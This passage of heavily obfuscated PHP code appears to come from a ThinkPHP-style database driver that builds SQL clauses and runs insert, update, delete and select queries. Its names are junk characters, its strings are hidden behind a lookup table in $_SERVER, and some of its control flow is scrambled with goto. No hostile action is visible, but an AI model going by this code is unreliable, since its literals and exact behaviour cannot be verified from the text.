$b´®¤­¡´ = array_map(array($this, $båˆå‘Ğ•Æ[878]), $b´®¤­¡´); } elseif (is_bool($b´®¤­¡´)) { $b´®¤­¡´ = $b´®¤­¡´ ? $båˆå‘Ğ•Æ[83] : $båˆå‘Ğ•Æ[485]; } elseif (is_null($b´®¤­¡´)) { $b´®¤­¡´ = $båˆå‘Ğ•Æ[99]; } return $b´®¤­¡´; } protected function parseField($Dâ¤³ŸÜ“) { $FÕËôíÚ® =& $_SERVER[úÎü]; if (is_string($Dâ¤³ŸÜ“) && strpos($Dâ¤³ŸÜ“, $FÕËôíÚ®[47])) { $Dâ¤³ŸÜ“ = explode($FÕËôíÚ®[47], $Dâ¤³ŸÜ“); } if (is_array($Dâ¤³ŸÜ“)) { $aåÏâÎÈ” = array(); foreach ($Dâ¤³ŸÜ“ as $Añ¥ÆŒŸÇ => $cÁƒ—îõ­Õ) { if (!is_numeric($Añ¥ÆŒŸÇ)) { $aåÏâÎÈ”[] = $this->parseKey($Añ¥ÆŒŸÇ) . $FÕËôíÚ®[916] . $this->parseKey($cÁƒ—îõ­Õ); } else { $aåÏâÎÈ”[] = $this->parseKey($cÁƒ—îõ­Õ); } } $a†ŞË‰å»Å = implode($FÕËôíÚ®[47], $aåÏâÎÈ”); } elseif (is_string($Dâ¤³ŸÜ“) && !empty($Dâ¤³ŸÜ“)) { $a†ŞË‰å»Å = $Dâ¤³ŸÜ“; } else { $a†ŞË‰å»Å = $FÕËôíÚ®[180]; } return $a†ŞË‰å»Å; } protected function parseTable($d§½¼ãåËš) { $eĞ¥ë¡ù¬Œ =& $_SERVER[úÎü]; if (is_array($d§½¼ãåËš)) { $DÖÒ¢ßóâå = array(); foreach ($d§½¼ãåËš as $EéÜ¡¬ˆèù => $c‡ºÏ‹¶) { if (!is_numeric($EéÜ¡¬ˆèù)) { $DÖÒ¢ßóâå[] = $this->parseKey($EéÜ¡¬ˆèù) . $eĞ¥ë¡ù¬Œ[50] . $this->parseKey($c‡ºÏ‹¶); } else { $DÖÒ¢ßóâå[] = $this->parseKey($EéÜ¡¬ˆèù); } } $d§½¼ãåËš = $DÖÒ¢ßóâå; } elseif (is_string($d§½¼ãåËš)) { if (strstr($d§½¼ãåËš, $eĞ¥ë¡ù¬Œ[50])) { return $d§½¼ãåËš; } $d§½¼ãåËš = explode($eĞ¥ë¡ù¬Œ[47], $d§½¼ãåËš); array_walk($d§½¼ãåËš, array($this, $eĞ¥ë¡ù¬Œ[825])); } return $eĞ¥ë¡ù¬Œ[819] . trim(implode($eĞ¥ë¡ù¬Œ[917], $d§½¼ãåËš), $eĞ¥ë¡ù¬Œ[375]) . $eĞ¥ë¡ù¬Œ[819]; } protected function parseWhere($F×Å¼À‹Í) { $e™©¢áË =& $_SERVER[úÎü]; $B§ô¹íï‹ƒ = $e™©¢áË[33]; if (is_string($F×Å¼À‹Í)) { $B§ô¹íï‹ƒ = $F×Å¼À‹Í; } else { $e»·ëŒŒ  = isset($F×Å¼À‹Í[$e™©¢áË[918]]) ? strtoupper($F×Å¼À‹Í[$e™©¢áË[918]]) : $e™©¢áË[33]; if (in_array($e»·ëŒŒ , array($e™©¢áË[919], $e™©¢áË[920], $e™©¢áË[921]))) { $e»·ëŒŒ  = $e™©¢áË[50] . $e»·ëŒŒ  . $e™©¢áË[50]; unset($F×Å¼À‹Í[$e™©¢áË[918]]); } else { $e»·ëŒŒ  = $e™©¢áË[922]; } foreach ($F×Å¼À‹Í as $f•»É‘Ààß => $aè·ŞªöÒÄ) { $B§ô¹íï‹ƒ .= $e™©¢áË[271]; if (is_numeric($f•»É‘Ààß)) { $f•»É‘Ààß = $e™©¢áË[923]; } if (0 === strpos($f•»É‘Ààß, $e™©¢áË[70])) { $B§ô¹íï‹ƒ .= $this->parseThinkWhere($f•»É‘Ààß, $aè·ŞªöÒÄ); } else { if (!preg_match($e™©¢áË[924], trim($f•»É‘Ààß))) { think_exception(think_lang($e™©¢áË[925]) . $e™©¢áË[4] . $f•»É‘Ààß); } $FÜ¬¨óí×‚ = is_array($aè·ŞªöÒÄ) && isset($aè·ŞªöÒÄ[$e™©¢áË[926]]); $f•»É‘Ààß = trim($f•»É‘Ààß); if (strpos($f•»É‘Ààß, $e™©¢áË[277])) { $cõó·òÁù = explode($e™©¢áË[277], $f•»É‘Ààß); $e‚Îäï‘Æî = array(); foreach ($cõó·òÁù as $B¡ÁœŠ÷í => $Aè„§Çğ¯Ì) { $c³™…÷Ïã± = $FÜ¬¨óí×‚ ? $aè·ŞªöÒÄ[$B¡ÁœŠ÷í] : $aè·ŞªöÒÄ; $e‚Îäï‘Æî[] = $e™©¢áË[254] . $this->parseWhereItem($this->parseKey($Aè„§Çğ¯Ì), $c³™…÷Ïã±) . $e™©¢áË[824]; } $B§ô¹íï‹ƒ .= implode($e™©¢áË[927], $e‚Îäï‘Æî); } elseif (strpos($f•»É‘Ààß, $e™©¢áË[278])) { $cõó·òÁù = explode($e™©¢áË[278], $f•»É‘Ààß); $e‚Îäï‘Æî = array(); foreach ($cõó·òÁù as $B¡ÁœŠ÷í => $Aè„§Çğ¯Ì) { $c³™…÷Ïã± = $FÜ¬¨óí×‚ ? $aè·ŞªöÒÄ[$B¡ÁœŠ÷í] : $aè·ŞªöÒÄ; $e‚Îäï‘Æî[] = $e™©¢áË[254] . $this->parseWhereItem($this->parseKey($Aè„§Çğ¯Ì), $c³™…÷Ïã±) . $e™©¢áË[824]; } $B§ô¹íï‹ƒ .= implode($e™©¢áË[922], $e‚Îäï‘Æî); } else { $B§ô¹íï‹ƒ .= $this->parseWhereItem($this->parseKey($f•»É‘Ààß), $aè·ŞªöÒÄ); } } $B§ô¹íï‹ƒ .= $e™©¢áË[272] . $e»·ëŒŒ ; } $B§ô¹íï‹ƒ = substr($B§ô¹íï‹ƒ, 0, -strlen($e»·ëŒŒ )); } return empty($B§ô¹íï‹ƒ) ? $e™©¢áË[33] : $e™©¢áË[928] . $B§ô¹íï‹ƒ; } protected function parseWhereItem($aŠö¡§†´Ÿ, $dÙ”£îº‹±) { $bÂ¢Â‰³ë =& $_SERVER[úÎü]; $d¹çÚˆöç = $bÂ¢Â‰³ë[33]; if (is_array($dÙ”£îº‹±)) { if (is_string($dÙ”£îº‹±[0])) { $D¯ñİœß‹Ô = strtolower($dÙ”£îº‹±[0]); if (in_array($dÙ”£îº‹±[0], array($bÂ¢Â‰³ë[912], $bÂ¢Â‰³ë[929], $bÂ¢Â‰³ë[930], $bÂ¢Â‰³ë[931], $bÂ¢Â‰³ë[932], $bÂ¢Â‰³ë[933]))) { $d¹çÚˆöç .= $aŠö¡§†´Ÿ . $bÂ¢Â‰³ë[50] . $dÙ”£îº‹±[0] . $bÂ¢Â‰³ë[50] . $this->parseValue($dÙ”£îº‹±[1]); } elseif (preg_match($bÂ¢Â‰³ë[934], $dÙ”£îº‹±[0])) { $d¹çÚˆöç .= $aŠö¡§†´Ÿ . $bÂ¢Â‰³ë[50] . $this->exp[$D¯ñİœß‹Ô] . $bÂ¢Â‰³ë[50] . $this->parseValue($dÙ”£îº‹±[1]); } elseif (preg_match($bÂ¢Â‰³ë[935], $dÙ”£îº‹±[0])) { if (is_array($dÙ”£îº‹±[1])) { $c¿Ì˜Ú«£ = isset($dÙ”£îº‹±[2]) ? strtoupper($dÙ”£îº‹±[2]) : $bÂ¢Â‰³ë[920]; if (in_array($c¿Ì˜Ú«£, array($bÂ¢Â‰³ë[919], $bÂ¢Â‰³ë[920], $bÂ¢Â‰³ë[921]))) { $b•ï¶£Ê = array(); foreach ($dÙ”£îº‹±[1] as $fŸâñ™“‹) { $b•ï¶£Ê[] = $aŠö¡§†´Ÿ . $bÂ¢Â‰³ë[50] . $this->exp[$D¯ñİœß‹Ô] . $bÂ¢Â‰³ë[50] . $this->parseValue($fŸâñ™“‹); } $d¹çÚˆöç .= $bÂ¢Â‰³ë[254] . implode($bÂ¢Â‰³ë[50] . $c¿Ì˜Ú«£ . $bÂ¢Â‰³ë[50], $b•ï¶£Ê) . $bÂ¢Â‰³ë[824]; } } else { $d¹çÚˆöç .= $aŠö¡§†´Ÿ . $bÂ¢Â‰³ë[50] . $this->exp[$D¯ñİœß‹Ô] . $bÂ¢Â‰³ë[50] . $this->parseValue($dÙ”£îº‹±[1]); } } elseif ($bÂ¢Â‰³ë[291] == $D¯ñİœß‹Ô) { $d¹çÚˆöç .= $bÂ¢Â‰³ë[822] . $aŠö¡§†´Ÿ . $bÂ¢Â‰³ë[50] . $dÙ”£îº‹±[1] . $bÂ¢Â‰³ë[936]; } elseif (preg_match($bÂ¢Â‰³ë[937], $dÙ”£îº‹±[0])) { $d¹çÚˆöç .= $dÙ”£îº‹±[0]; } elseif (preg_match($bÂ¢Â‰³ë[938], $dÙ”£îº‹±[0])) { if (isset($dÙ”£îº‹±[2]) && $bÂ¢Â‰³ë[291] == $dÙ”£îº‹±[2]) { $d¹çÚˆöç .= $aŠö¡§†´Ÿ . $bÂ¢Â‰³ë[50] . $this->exp[$D¯ñİœß‹Ô] . $bÂ¢Â‰³ë[50] . $dÙ”£îº‹±[1]; } else { if (is_string($dÙ”£îº‹±[1])) { $dÙ”£îº‹±[1] = explode($bÂ¢Â‰³ë[47], $dÙ”£îº‹±[1]); } $DÎÄø•Ëâ = implode($bÂ¢Â‰³ë[47], $this->parseValue($dÙ”£îº‹±[1])); $d¹çÚˆöç .= $aŠö¡§†´Ÿ . $bÂ¢Â‰³ë[50] . $this->exp[$D¯ñİœß‹Ô] . $bÂ¢Â‰³ë[822] . $DÎÄø•Ëâ . $bÂ¢Â‰³ë[824]; } } elseif (preg_match($bÂ¢Â‰³ë[939], $dÙ”£îº‹±[0])) { $bŸ‰ ½Üİô = is_string($dÙ”£îº‹±[1]) ? explode($bÂ¢Â‰³ë[47], $dÙ”£îº‹±[1]) : $dÙ”£îº‹±[1]; $d¹çÚˆöç .= $bÂ¢Â‰³ë[822] . $aŠö¡§†´Ÿ . $bÂ¢Â‰³ë[50] . $this->exp[$D¯ñİœß‹Ô] . $bÂ¢Â‰³ë[50] . $this->parseValue($bŸ‰ ½Üİô[0]) . $bÂ¢Â‰³ë[922] . $this->parseValue($bŸ‰ ½Üİô[1]) . $bÂ¢Â‰³ë[272]; } else { think_exception(think_lang($bÂ¢Â‰³ë[925]) . $bÂ¢Â‰³ë[4] . $dÙ”£îº‹±[0]); } } else { $D±ğ“ËÛ  = count($dÙ”£îº‹±); $c‡„Ğ—·èÃ = $bÂ¢Â‰³ë[33]; if (is_string($dÙ”£îº‹±[$D±ğ“ËÛ  - 1])) { $c‡„Ğ—·èÃ = isset($dÙ”£îº‹±[$D±ğ“ËÛ  - 1]) ? strtoupper($dÙ”£îº‹±[$D±ğ“ËÛ  - 1]) : $bÂ¢Â‰³ë[33]; if (in_array($c‡„Ğ—·èÃ, array($bÂ¢Â‰³ë[919], $bÂ¢Â‰³ë[920], $bÂ¢Â‰³ë[921]))) { $D±ğ“ËÛ  = $D±ğ“ËÛ  - 1; } } else { $c‡„Ğ—·èÃ = $bÂ¢Â‰³ë[919]; } for ($féºÙÄªí = 0; $féºÙÄªí < $D±ğ“ËÛ ; $féºÙÄªí++) { $bŸ‰ ½Üİô = is_array($dÙ”£îº‹±[$féºÙÄªí]) ? $dÙ”£îº‹±[$féºÙÄªí][1] : $dÙ”£îº‹±[$féºÙÄªí]; if ($bÂ¢Â‰³ë[291] == strtolower($dÙ”£îº‹±[$féºÙÄªí][0])) { $d¹çÚˆöç .= $bÂ¢Â‰³ë[254] . $aŠö¡§†´Ÿ . $bÂ¢Â‰³ë[50] . $bŸ‰ ½Üİô . $bÂ¢Â‰³ë[936] . $c‡„Ğ—·èÃ . $bÂ¢Â‰³ë[50]; } else { $eÄÌ·¤‹ï± = is_array($dÙ”£îº‹±[$féºÙÄªí]) ? $this->exp[strtolower($dÙ”£îº‹±[$féºÙÄªí][0])] : $bÂ¢Â‰³ë[912]; if (!$eÄÌ·¤‹ï± && is_array($dÙ”£îº‹±[$féºÙÄªí]) && in_array($dÙ”£îº‹±[$féºÙÄªí][0], array($bÂ¢Â‰³ë[912], $bÂ¢Â‰³ë[929], $bÂ¢Â‰³ë[930], $bÂ¢Â‰³ë[931], $bÂ¢Â‰³ë[932], $bÂ¢Â‰³ë[933]))) { $eÄÌ·¤‹ï± = $dÙ”£îº‹±[$féºÙÄªí][0]; } $d¹çÚˆöç .= $bÂ¢Â‰³ë[254] . $aŠö¡§†´Ÿ . $bÂ¢Â‰³ë[50] . $eÄÌ·¤‹ï± . $bÂ¢Â‰³ë[50] . $this->parseValue($bŸ‰ ½Üİô) . $bÂ¢Â‰³ë[936] . $c‡„Ğ—·èÃ . $bÂ¢Â‰³ë[50]; } } $d¹çÚˆöç = substr($d¹çÚˆöç, 0, -4); } } else { $d¹çÚˆöç .= $aŠö¡§†´Ÿ . $bÂ¢Â‰³ë[940] . $this->parseValue($dÙ”£îº‹±); } return $d¹çÚˆöç; } protected function parseThinkWhere($cá…¥œ¯¿, $dÓ’°¬ƒ……) { $C—®´Ç£‚† =& $_SERVER[úÎü]; $bµâµ­…ƒ = $C—®´Ç£‚†[33]; switch ($cá…¥œ¯¿) { case $C—®´Ç£‚†[346]: $bµâµ­…ƒ = $dÓ’°¬ƒ……; break; case $C—®´Ç£‚†[923]: $bµâµ­…ƒ = is_string($dÓ’°¬ƒ……) ? $dÓ’°¬ƒ…… : substr($this->parseWhere($dÓ’°¬ƒ……), 6); break; case $C—®´Ç£‚†[941]: parse_str($dÓ’°¬ƒ……, $cÆ¦ƒ¿Úáù); if (isset($cÆ¦ƒ¿Úáù[$C—®´Ç£‚†[918]])) { $cë½ççáÂÜ = $C—®´Ç£‚†[50] . strtoupper($cÆ¦ƒ¿Úáù[$C—®´Ç£‚†[918]]) . $C—®´Ç£‚†[50]; unset($cÆ¦ƒ¿Úáù[$C—®´Ç£‚†[918]]); } else { $cë½ççáÂÜ = $C—®´Ç£‚†[922]; } $a›²¥¬„´ = array(); foreach ($cÆ¦ƒ¿Úáù as $c…Ó•õ² => $Bˆ£™§‡šÎ) { $a›²¥¬„´[] = $this->parseKey($c…Ó•õ²) . $C—®´Ç£‚†[940] . $this->parseValue($Bˆ£™§‡šÎ); } $bµâµ­…ƒ = implode($cë½ççáÂÜ, $a›²¥¬„´); break; } return $bµâµ­…ƒ; } protected function parseLimit($D›±—‰ìÏ) { $fæ®ƒ –æ• =& $_SERVER[úÎü]; return !empty($D›±—‰ìÏ) ? $fæ®ƒ –æ•[48] . $D›±—‰ìÏ . $fæ®ƒ –æ•[50] : $fæ®ƒ –æ•[33]; } protected function parseJoin($F¨îÄ­¢Â) { $F·¾ø»ÛõŠ =& $_SERVER[úÎü]; $aïñÔÛòÆ = $F·¾ø»ÛõŠ[33]; if (!empty($F¨îÄ­¢Â)) { if (is_array($F¨îÄ­¢Â)) { foreach ($F¨îÄ­¢Â as $A°ãÕ“ƒçÔ => $D³ÖôĞ£È) { if (!1 !== stripos($D³ÖôĞ£È, $F·¾ø»ÛõŠ[942])) { $aïñÔÛòÆ .= $F·¾ø»ÛõŠ[50] . $D³ÖôĞ£È; } else { $aïñÔÛòÆ .= $F·¾ø»ÛõŠ[943] . $D³ÖôĞ£È; } } } else { $aïñÔÛòÆ .= $F·¾ø»ÛõŠ[943] . $F¨îÄ­¢Â; } } $aïñÔÛòÆ = preg_replace($F·¾ø»ÛõŠ[944], think_config($F·¾ø»ÛõŠ[850]) . $F·¾ø»ÛõŠ[945], $aïñÔÛòÆ); return $aïñÔÛòÆ; } protected function parseOrder($bÂÓÏ«±é) { $f´¢±‰›ì¶ =& $_SERVER[úÎü]; if (is_array($bÂÓÏ«±é)) { $BŠ§ÚàÒ©Ş = array(); foreach ($bÂÓÏ«±é as $EÖº²©ÈÔÌ => $bğóóÛÊ›) { if (is_numeric($EÖº²©ÈÔÌ)) { $BŠ§ÚàÒ©Ş[] = $this->parseKey($bğóóÛÊ›); } else { $bğóóÛÊ› = in_array(strtoupper(trim($bğóóÛÊ›)), array($f´¢±‰›ì¶[946], $f´¢±‰›ì¶[947])) ? $f´¢±‰›ì¶[50] . $bğóóÛÊ› : $f´¢±‰›ì¶[33]; if (preg_match($f´¢±‰›ì¶[948], $EÖº²©ÈÔÌ)) { $BŠ§ÚàÒ©Ş[] = $this->parseKey($EÖº²©ÈÔÌ) . $bğóóÛÊ›; } else { think_exception($f´¢±‰›ì¶[949] . $EÖº²©ÈÔÌ); } } } $bÂÓÏ«±é = implode($f´¢±‰›ì¶[47], $BŠ§ÚàÒ©Ş); } return !empty($bÂÓÏ«±é) ? $f´¢±‰›ì¶[950] . $bÂÓÏ«±é : $f´¢±‰›ì¶[33]; } protected function parseGroup($CİŒ·æË£æ) { $BæíìĞ¡½ =& $_SERVER[úÎü]; return !empty($CİŒ·æË£æ) ? $BæíìĞ¡½[951] . $CİŒ·æË£æ : $BæíìĞ¡½[33]; } protected function parseHaving($CÔŞ ’š½) { $cÆƒ–ˆÛ›» =& $_SERVER[úÎü]; return !empty($CÔŞ ’š½) ? $cÆƒ–ˆÛ›»[952] . $CÔŞ ’š½ : $cÆƒ–ˆÛ›»[33]; } protected function parseComment($FñŒ÷›š¯Ë) { $Cß°ù”Èà“ =& $_SERVER[úÎü]; return !empty($FñŒ÷›š¯Ë) ? $Cß°ù”Èà“[953] . $FñŒ÷›š¯Ë . $Cß°ù”Èà“[954] : $Cß°ù”Èà“[33]; } protected function parseDistinct($A»áÍ‹Èªø) { $eÕ…º–íë =& $_SERVER[úÎü]; return !empty($A»áÍ‹Èªø) ? $eÕ…º–íë[955] : $eÕ…º–íë[33]; } protected function parseUnion($F¥½Ä„«’Ğ) { $f¤‘ÎŞ¾± =& $_SERVER[úÎü]; if (empty($F¥½Ä„«’Ğ)) { return $f¤‘ÎŞ¾±[33]; } if (isset($F¥½Ä„«’Ğ[$f¤‘ÎŞ¾±[342]])) { $B‰š¶Ç­çÄ = $f¤‘ÎŞ¾±[956]; unset($F¥½Ä„«’Ğ[$f¤‘ÎŞ¾±[342]]); } else { $B‰š¶Ç­çÄ = $f¤‘ÎŞ¾±[957]; } foreach ($F¥½Ä„«’Ğ as $Aò¹ÁØ Ÿ¸) { $CñÅÍ–„¤[] = $B‰š¶Ç­çÄ . (is_array($Aò¹ÁØ Ÿ¸) ? $this->buildSelectSql($Aò¹ÁØ Ÿ¸) : $Aò¹ÁØ Ÿ¸); } return implode($f¤‘ÎŞ¾±[50], $CñÅÍ–„¤); } public function insert($F¿·ø„Š—›, $CãÊÙ„ºˆ = array(), $eİŞñ’øí = false) { goto C—´ïÄóÎ°; F½‹ÇÓËùô: $cÄí†áÎ .= $this->parseComment(!empty($CãÊÙ„ºˆ[$d¯‰²º°Ö[348]]) ? $CãÊÙ„ºˆ[$d¯‰²º°Ö[348]] : $d¯‰²º°Ö[33]); return $this->execute($cÄí†áÎ, $this->parseBind(!empty($CãÊÙ„ºˆ[$d¯‰²º°Ö[279]]) ? $CãÊÙ„ºˆ[$d¯‰²º°Ö[279]] : array())); goto EÆ¼…’Í”; fÎÏ¤íùŒ: foreach ($F¿·ø„Š—› as $a¤Ã¬’Øà” => $D‰—Ø‰õì) { if (is_array($D‰—Ø‰õì) && $d¯‰²º°Ö[291] == $D‰—Ø‰õì[0]) { $Fï®¾ÇÇÏÌ[] = $this->parseKey($a¤Ã¬’Øà”); $D²•™­Œì¤[] = $D‰—Ø‰õì[1]; } elseif (is_scalar($D‰—Ø‰õì) || is_null($D‰—Ø‰õì)) { $Fï®¾ÇÇÏÌ[] = $this->parseKey($a¤Ã¬’Øà”); $D²•™­Œì¤[] = $this->parseValue($D‰—Ø‰õì); } } $cÄí†áÎ = ($eİŞñ’øí ? $d¯‰²º°Ö[826] : $d¯‰²º°Ö[827]) . $d¯‰²º°Ö[828] . $this->parseTable($CãÊÙ„ºˆ[$d¯‰²º°Ö[273]]) . $d¯‰²º°Ö[822] . implode($d¯‰²º°Ö[47], $Fï®¾ÇÇÏÌ) . $d¯‰²º°Ö[823] . implode($d¯‰²º°Ö[47], $D²•™­Œì¤) . $d¯‰²º°Ö[824]; $cÄí†áÎ .= $this->parseLock(isset($CãÊÙ„ºˆ[$d¯‰²º°Ö[774]]) ? $CãÊÙ„ºˆ[$d¯‰²º°Ö[774]] : !1); goto F½‹ÇÓËùô; C—´ïÄóÎ°: $d¯‰²º°Ö =& $_SERVER[úÎü]; $D²•™­Œì¤ = $Fï®¾ÇÇÏÌ = array(); $this->model = $CãÊÙ„ºˆ[$d¯‰²º°Ö[275]]; goto fÎÏ¤íùŒ; EÆ¼…’Í”: } public function selectInsert($BÂï§¬¥°«, $Fòˆ°–õ„Ç, $BÊèÛöÑÀø = array()) { goto c‘êç„ÆÓ; c‘êç„ÆÓ: $F¼°·İ´§¯ =& $_SERVER[úÎü]; $this->model = $BÊèÛöÑÀø[$F¼°·İ´§¯[275]]; if (is_string($BÂï§¬¥°«)) { $BÂï§¬¥°« = explode($F¼°·İ´§¯[47], $BÂï§¬¥°«); } goto e¢¯ôÁ­Óí; b›Ï‘Œ—Æì: return $this->execute($bµ×²ÒğŒ, $this->parseBind(!empty($BÊèÛöÑÀø[$F¼°·İ´§¯[279]]) ? $BÊèÛöÑÀø[$F¼°·İ´§¯[279]] : array())); goto aÍ¨ÓÂ–ö; e¢¯ôÁ­Óí: array_walk($BÂï§¬¥°«, array($this, $F¼°·İ´§¯[825])); $bµ×²ÒğŒ = $F¼°·İ´§¯[958] . $this->parseTable($Fòˆ°–õ„Ç) . $F¼°·İ´§¯[822] . implode($F¼°·İ´§¯[47], $BÂï§¬¥°«) . $F¼°·İ´§¯[936]; $bµ×²ÒğŒ .= $this->buildSelectSql($BÊèÛöÑÀø); goto b›Ï‘Œ—Æì; aÍ¨ÓÂ–ö: } public function update($c§İ½‹Ø¢ğ, $EğíÀÃÍ) { $Fªİ¸’˜‚Ó =& $_SERVER[úÎü]; $this->model = $EğíÀÃÍ[$Fªİ¸’˜‚Ó[275]]; $f¤’‹Î¡É = $Fªİ¸’˜‚Ó[959] . $this->parseTable($EğíÀÃÍ[$Fªİ¸’˜‚Ó[273]]) . $this->parseSet($c§İ½‹Ø¢ğ) . $this->parseWhere(!empty($EğíÀÃÍ[$Fªİ¸’˜‚Ó[269]]) ? $EğíÀÃÍ[$Fªİ¸’˜‚Ó[269]] : $Fªİ¸’˜‚Ó[33]) . $this->parseOrder(!empty($EğíÀÃÍ[$Fªİ¸’˜‚Ó[357]]) ? $EğíÀÃÍ[$Fªİ¸’˜‚Ó[357]] : $Fªİ¸’˜‚Ó[33]) . $this->parseLimit(!empty($EğíÀÃÍ[$Fªİ¸’˜‚Ó[286]]) ? $EğíÀÃÍ[$Fªİ¸’˜‚Ó[286]] : $Fªİ¸’˜‚Ó[33]) . $this->parseLock(isset($EğíÀÃÍ[$Fªİ¸’˜‚Ó[774]]) ? $EğíÀÃÍ[$Fªİ¸’˜‚Ó[774]] : !1) . $this->parseComment(!empty($EğíÀÃÍ[$Fªİ¸’˜‚Ó[348]]) ? $EğíÀÃÍ[$Fªİ¸’˜‚Ó[348]] : $Fªİ¸’˜‚Ó[33]); return $this->execute($f¤’‹Î¡É, $this->parseBind(!empty($EğíÀÃÍ[$Fªİ¸’˜‚Ó[279]]) ? $EğíÀÃÍ[$Fªİ¸’˜‚Ó[279]] : array())); } public function delete($F§Ùò”¡ì¡ = array()) { $e÷øàƒœ =& $_SERVER[úÎü]; $this->model = $F§Ùò”¡ì¡[$e÷øàƒœ[275]]; $F¨˜á‹¢ö = $e÷øàƒœ[960] . $this->parseTable($F§Ùò”¡ì¡[$e÷øàƒœ[273]]) . $this->parseWhere(!empty($F§Ùò”¡ì¡[$e÷øàƒœ[269]]) ? $F§Ùò”¡ì¡[$e÷øàƒœ[269]] : $e÷øàƒœ[33]) . $this->parseOrder(!empty($F§Ùò”¡ì¡[$e÷øàƒœ[357]]) ? $F§Ùò”¡ì¡[$e÷øàƒœ[357]] : $e÷øàƒœ[33]) . $this->parseLimit(!empty($F§Ùò”¡ì¡[$e÷øàƒœ[286]]) ? $F§Ùò”¡ì¡[$e÷øàƒœ[286]] : $e÷øàƒœ[33]) . $this->parseLock(isset($F§Ùò”¡ì¡[$e÷øàƒœ[774]]) ? $F§Ùò”¡ì¡[$e÷øàƒœ[774]] : !1) . $this->parseComment(!empty($F§Ùò”¡ì¡[$e÷øàƒœ[348]]) ? $F§Ùò”¡ì¡[$e÷øàƒœ[348]] : $e÷øàƒœ[33]); return $this->execute($F¨˜á‹¢ö, $this->parseBind(!empty($F§Ùò”¡ì¡[$e÷øàƒœ[279]]) ? $F§Ùò”¡ì¡[$e÷øàƒœ[279]] : array())); } public function select($EÂŒø‰£Ó = array()) { goto F®á¢ç¡Ô; DØ×Ö¡ï¤—: $e¹õö§ñ·· = isset($EÂŒø‰£Ó[$cŒ÷çâ·×È[343]]) ? $EÂŒø‰£Ó[$cŒ÷çâ·×È[343]] : !1; if ($e¹õö§ñ··) { $A¬ÌÚè¹¿‰ = is_string($e¹õö§ñ··[$cŒ÷çâ·×È[89]]) ? $e¹õö§ñ··[$cŒ÷çâ·×È[89]] : $cŒ÷çâ·×È[961] . md5($A‘ÜóºùÊØ); $dĞ¼ğñƒ¯Î = think_cache($A¬ÌÚè¹¿‰, $cŒ÷çâ·×È[33], $e¹õö§ñ··); if (!1 !== $dĞ¼ğñƒ¯Î) { return $dĞ¼ğñƒ¯Î; } } $dà™İõ± = $this->query($A‘ÜóºùÊØ, $this->parseBind(!empty($EÂŒø‰£Ó[$cŒ÷çâ·×È[279]]) ? $EÂŒø‰£Ó[$cŒ÷çâ·×È[279]] : array())); goto DÂ…êÎ³Àí; F®á¢ç¡Ô: $cŒ÷çâ·×È =& $_SERVER[úÎü]; $this->model = $EÂŒø‰£Ó[$cŒ÷çâ·×È[275]]; $A‘ÜóºùÊØ = $this->buildSelectSql($EÂŒø‰£Ó); goto DØ×Ö¡ï¤—; DÂ…êÎ³Àí: if ($e¹õö§ñ·· && !1 !== $dà™İõ±) { think_cache($A¬ÌÚè¹¿‰, $dà™İõ±, $e¹õö§ñ··); } return $dà™İõ±; goto aÍİÇ×Œ÷â; aÍİÇ×Œ÷â: } public function buildSelectSql($E†ó”„±Ä™ = array()) { goto B§ó¬…í»¦; Aµ²ñ¡õ„: return $eèÅ’¥ÏÑ½; goto FŸ¥•øõŸ¸; BİÌä¼È÷: $eèÅ’¥ÏÑ½ = $this->parseSql($this->selectSql, $E†ó”„±Ä™); $eèÅ’¥ÏÑ½ .= $this->parseLock(isset($E†ó”„±Ä™[$fâÀ¥ËÈ‘Š[774]]) ? $E†ó”„±Ä™[$fâÀ¥ËÈ‘Š[774]] : !1); if (isset($AÎöåàÅ«™)) { think_cache($AÎöåàÅ«™, $eèÅ’¥ÏÑ½); } goto Aµ²ñ¡õ„; B§ó¬…í»¦: $fâÀ¥ËÈ‘Š =& $_SERVER[úÎü]; if (isset($E†ó”„±Ä™[$fâÀ¥ËÈ‘Š[347]])) { if (strpos($E†ó”„±Ä™[$fâÀ¥ËÈ‘Š[347]], $fâÀ¥ËÈ‘Š[47])) { list($aöŠë¥ÚÈí, $FÛø‡ÇáÖ×) = explode($fâÀ¥ËÈ‘Š[47], $E†ó”„±Ä™[$fâÀ¥ËÈ‘Š[347]]); } else { $aöŠë¥ÚÈí = $E†ó”„±Ä™[$fâÀ¥ËÈ‘Š[347]]; } $aöŠë¥ÚÈí = $aöŠë¥ÚÈí ? $aöŠë¥ÚÈí : 1; $FÛø‡ÇáÖ× = isset($FÛø‡ÇáÖ×) ? $FÛø‡ÇáÖ× : (is_numeric($E†ó”„±Ä™[$fâÀ¥ËÈ‘Š[286]]) ? $E†ó”„±Ä™[$fâÀ¥ËÈ‘Š[286]] : 20); $a™­¼ÏÆ—¶ = $FÛø‡ÇáÖ× * ((int) $aöŠë¥ÚÈí - 1); $E†ó”„±Ä™[$fâÀ¥ËÈ‘Š[286]] = $a™­¼ÏÆ—¶ . $fâÀ¥ËÈ‘Š[47] . $FÛø‡ÇáÖ×; } if (think_config($fâÀ¥ËÈ‘Š[962])) { $AÎöåàÅ«™ = $fâÀ¥ËÈ‘Š[963] . md5(serialize($E†ó”„±Ä™)); $Bç›Ğß§ë– = think_cache($AÎöåàÅ«™); if ($Bç›Ğß§ë–) { return $Bç›Ğß§ë–; } } goto BİÌä¼È÷; FŸ¥•øõŸ¸: } public function parseSql($B·ƒÜÂ ¡·, $aóË¾˜í‡ = array()) { $fè¨‰³»õĞ =& $_SERVER[úÎü]; $B·ƒÜÂ ¡· = str_replace(array($fè¨‰³»õĞ[964], $fè¨‰³»õĞ[965], $fè¨‰³»õĞ[966], $fè¨‰³»õĞ[967], $fè¨‰³»õĞ[968], $fè¨‰³»õĞ[969], $fè¨‰³»õĞ[970], $fè¨‰³»õĞ[971], $fè¨‰³»õĞ[972], $fè¨‰³»õĞ[973], $fè¨‰³»õĞ[974]), array($this->parseTable("{$aóË¾˜í‡[$fè¨‰³»õĞ[273]]}"), $this->parseDistinct(isset($aóË¾˜í‡[$fè¨‰³»õĞ[975]]) ? $aóË¾˜í‡[$fè¨‰³»õĞ[975]] : !1), $this->parseField(!empty($aóË¾˜í‡[$fè¨‰³»õĞ[267]]) ? $aóË¾˜í‡[$fè¨‰³»õĞ[267]] : $fè¨‰³»õĞ[180]), $this->parseJoin(!empty($aóË¾˜í‡[$fè¨‰³»õĞ[276]]) ? $aóË¾˜í‡[$fè¨‰³»õĞ[276]] : $fè¨‰³»õĞ[33]), $this->parseWhere(!empty($aóË¾˜í‡[$fè¨‰³»õĞ[269]]) ? $aóË¾˜í‡[$fè¨‰³»õĞ[269]] : $fè¨‰³»õĞ[33]), 